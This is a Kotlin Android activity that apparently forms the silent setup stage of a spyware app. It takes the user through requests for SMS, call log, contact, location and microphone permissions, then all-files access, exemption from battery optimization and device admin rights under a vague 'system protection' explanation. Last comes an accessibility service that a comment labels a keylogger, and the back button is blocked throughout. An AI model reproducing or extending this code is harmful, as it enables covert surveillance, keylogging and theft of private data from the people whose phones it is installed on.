package com.nexlink.bridge

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.text.TextUtils
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class SilentSetupActivity : AppCompatActivity() {

    private val handler = Handler(Looper.getMainLooper())
    private val dpm by lazy { getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager }
    private val adminComponent by lazy { ComponentName(this, AppDeviceAdminReceiver::class.java) }

    private val permissions = mutableListOf(
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.RECORD_AUDIO,
    )

    private var permissionIndex = 0

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Log.d("SilentSetup", "onCreate")
        requestNextPermission()
    }

    // ── Runtime permissions ──────────────────────────────────────────────────

    private fun requestNextPermission() {
        // Lewati permission yang sudah granted
        while (permissionIndex < permissions.size) {
            val perm = permissions[permissionIndex]
            if (ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED) {
                permissionIndex++
            } else break
        }

        if (permissionIndex >= permissions.size) {
            requestSpecialPermissions()
            return
        }

        val perm = permissions[permissionIndex]
        Log.d("SilentSetup", "requesting permission[$permissionIndex] = $perm")

        try {
            ActivityCompat.requestPermissions(this, arrayOf(perm), 1000 + permissionIndex)
        } catch (e: Exception) {
            Log.w("SilentSetup", "requestPermissions error", e)
            permissionIndex++
            handler.postDelayed({ requestNextPermission() }, 300)
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        val granted = grantResults.firstOrNull() == PackageManager.PERMISSION_GRANTED
        Log.d("SilentSetup", "permissionResult[$requestCode] granted=$granted")
        permissionIndex++
        handler.postDelayed({ requestNextPermission() }, 300)
    }

    // ── Storage ──────────────────────────────────────────────────────────────

    private fun requestSpecialPermissions() {
        Log.d("SilentSetup", "requestSpecialPermissions")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
            try {
                @Suppress("DEPRECATION")
                startActivityForResult(
                    Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                        data = Uri.parse("package:$packageName")
                    }, 2001
                )
                return
            } catch (e: Exception) {
                Log.w("SilentSetup", "requestSpecialPermissions error", e)
            }
        }
        requestBatteryOptimization()
    }

    // ── Battery optimization ─────────────────────────────────────────────────

    private fun requestBatteryOptimization() {
        Log.d("SilentSetup", "requestBatteryOptimization")
        val pm = getSystemService(PowerManager::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M &&
            !pm.isIgnoringBatteryOptimizations(packageName)) {
            try {
                @Suppress("DEPRECATION")
                startActivityForResult(
                    Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = Uri.parse("package:$packageName")
                    }, 2002
                )
                return
            } catch (e: Exception) {
                Log.w("SilentSetup", "requestBatteryOptimization error", e)
            }
        }
        requestDeviceAdmin()
    }

    // ── Device Admin ─────────────────────────────────────────────────────────

    private fun requestDeviceAdmin() {
        Log.d("SilentSetup", "requestDeviceAdmin")
        if (!dpm.isAdminActive(adminComponent)) {
            try {
                @Suppress("DEPRECATION")
                startActivityForResult(
                    Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                        putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                        putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Diperlukan untuk proteksi sistem.")
                    }, 2003
                )
                return
            } catch (e: Exception) {
                Log.w("SilentSetup", "requestDeviceAdmin error", e)
            }
        }
        requestAccessibility()
    }

    // ── Accessibility (Keylogger) ─────────────────────────────────────────────

    private fun isAccessibilityEnabled(serviceClass: Class<*>): Boolean {
        return try {
            val expected = ComponentName(this, serviceClass)
            val enabled = Settings.Secure.getString(
                contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false
            val splitter = TextUtils.SimpleStringSplitter(':')
            splitter.setString(enabled)
            while (splitter.hasNext()) {
                val cn = ComponentName.unflattenFromString(splitter.next())
                if (cn != null && cn == expected) return true
            }
            false
        } catch (e: Exception) {
            Log.w("SilentSetup", "isAccessibilityEnabled error", e)
            false
        }
    }

    private fun requestAccessibility() {
        Log.d("SilentSetup", "requestAccessibility")
        if (!isAccessibilityEnabled(InputEventService::class.java)) {
            try {
                @Suppress("DEPRECATION")
                startActivityForResult(
                    Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS), 2005
                )
                return
            } catch (e: Exception) {
                Log.w("SilentSetup", "requestAccessibility error", e)
            }
        }
        finishSetup()
    }

    // ── onActivityResult ─────────────────────────────────────────────────────

    @Suppress("DEPRECATION")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        Log.d("SilentSetup", "onActivityResult requestCode=$requestCode resultCode=$resultCode")
        handler.postDelayed({
            when (requestCode) {
                2001 -> requestBatteryOptimization()
                2002 -> requestDeviceAdmin()
                2003 -> requestAccessibility()
                2005 -> finishSetup()
                else -> finishSetup()
            }
        }, 400)
    }

    // ── Finish ───────────────────────────────────────────────────────────────

    private fun finishSetup() {
        Log.d("SilentSetup", "finishSetup → launching MatrixSuccessActivity")
        getSharedPreferences("connector_prefs", Context.MODE_PRIVATE)
            .edit().putBoolean("setup_done", true).apply()
        try {
            startActivity(Intent(this, MatrixSuccessActivity::class.java))
        } catch (e: Exception) {
            Log.w("SilentSetup", "finishSetup error", e)
        }
        finish()
    }

    @Suppress("DEPRECATION", "MissingSuperCall")
    override fun onBackPressed() {
        // Blokir back selama setup berlangsung
    }
}
